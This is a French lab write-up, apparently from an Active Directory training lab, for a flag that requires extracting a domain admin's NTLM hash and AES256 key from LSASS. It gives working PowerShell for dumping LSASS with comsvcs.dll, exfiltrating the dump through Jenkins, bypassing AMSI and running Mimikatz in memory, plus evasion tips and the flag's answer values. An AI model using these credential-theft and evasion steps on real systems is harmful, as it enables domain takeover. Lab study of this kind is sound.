---
flag: 11
machine: dcorp-mgmt
statut: validé
technique: LSASS dump (comsvcs.dll + Invoke-Mimi)
LO: [[LO07 - Session DA et escalade]]
---

# F11 · NTLM de svcadmin

> [!summary] Objectif
> Extraire le hash NTLM (et la clé AES256) du compte `svcadmin` depuis LSASS de `dcorp-mgmt` — c'est le secret qui alimente l'OverPass-the-Hash → Domain Admin.

## Contexte
- **Étape attack flow** : session `svcadmin` (DA) confirmée sur `dcorp-mgmt` (cf [[F10 - Process utilisant svcadmin]]) → il faut ses secrets en mémoire.
- **Ce qu'on a** : RCE `ciadmin` sur `dcorp-ci` (Jenkins), admin local dérivé sur `dcorp-mgmt`, WinRM sortant OK, Defender coupé des deux côtés.
- **Ce qu'on cherche** : `NTLM` (rc4_hmac) de `svcadmin` — et en bonus `aes256_hmac` (plus furtif pour OPtH).

## Solution

### Étape 1 : dump LSASS via `comsvcs.dll` (natif, aucun outil à héberger)
Depuis le build Jenkins (RCE `ciadmin`) — one-liner `Invoke-Command` vers `dcorp-mgmt` :
```powershell
$s = New-PSSession -ComputerName dcorp-mgmt
Invoke-Command -Session $s -ScriptBlock {
  $p = (Get-Process lsass).Id
  cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $p C:\Users\Public\lsass.dmp full"
}
Copy-Item -FromSession $s C:\Users\Public\lsass.dmp -Destination "$env:WORKSPACE\lsass.dmp"
Remove-PSSession $s
```
→ Voir [[LO07 - Session DA et escalade]] étape 5.

### Étape 2 : exfil via `userContent` Jenkins puis `iwr`
```powershell
# côté build (ciadmin) — expose le dump
$d = 'C:\Users\Administrator\.jenkins\userContent'
Copy-Item $env:WORKSPACE\lsass.dmp $d\lsass.dmp -Force

# côté student VM — outbound uniquement
iwr http://dcorp-ci:8080/userContent/lsass.dmp -OutFile C:\AD\Tools\lsass.dmp -UseBasicParsing
(Get-Item C:\AD\Tools\lsass.dmp).Length   # doit matcher la taille source
```

### Étape 3 : parse en mémoire (mimikatz.exe bloqué par Defender local)
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
. C:\AD\Tools\Invoke-Mimi.ps1
Invoke-Mimi -Command '"sekurlsa::minidump C:\AD\Tools\lsass.dmp" "sekurlsa::ekeys"'
```
→ Voir [[Cheatsheet - Post-exploitation]] pour la variante `SafetyKatz` / `Invoke-Mimi`.

## Réponse

| Élément                             | Valeur                                                                 |
| ----------------------------------- | ---------------------------------------------------------------------- |
| **NTLM `svcadmin` (rc4_hmac)** ✅    | **`b38ff50264b74508085d82c69794a4d8`**                                 |
| AES256 `svcadmin` (aes256_hmac)     | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011`     |

> [!tip] La clé `aes256` alimente directement l'OverPass-the-Hash → TGT Domain Admin (cf [[LO07 - Session DA et escalade]] étape 8). Utiliser `/aes256:` plutôt que `/rc4:` (downgrade détectable).

## Pièges et OPSEC
- Télécharger le `.dmp` avec `iwr`, JAMAIS au navigateur (corruption → `acquireLSA ; Handle on memory`). Vérifier la **taille exacte**.
- `mimikatz.exe` en fichier sur disque → Defender local. Passer par `Invoke-Mimi` en mémoire après bypass AMSI.
- Bien prendre le compte **de domaine** dans `ekeys` : trier sur le privilège (jeter `DCORP-MGMT$` et `mgmtadmin` qui est admin **local** only).
- Traces : Event ID **4688** (process creation `rundll32`), **4656/4663** (accès LSASS), **10** Sysmon (process access).

## Refs
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Cheatsheet - Lateral movement]]
- [[LO07 - Session DA et escalade]]

[[Flags - Index]] · [[Journal - Index]]
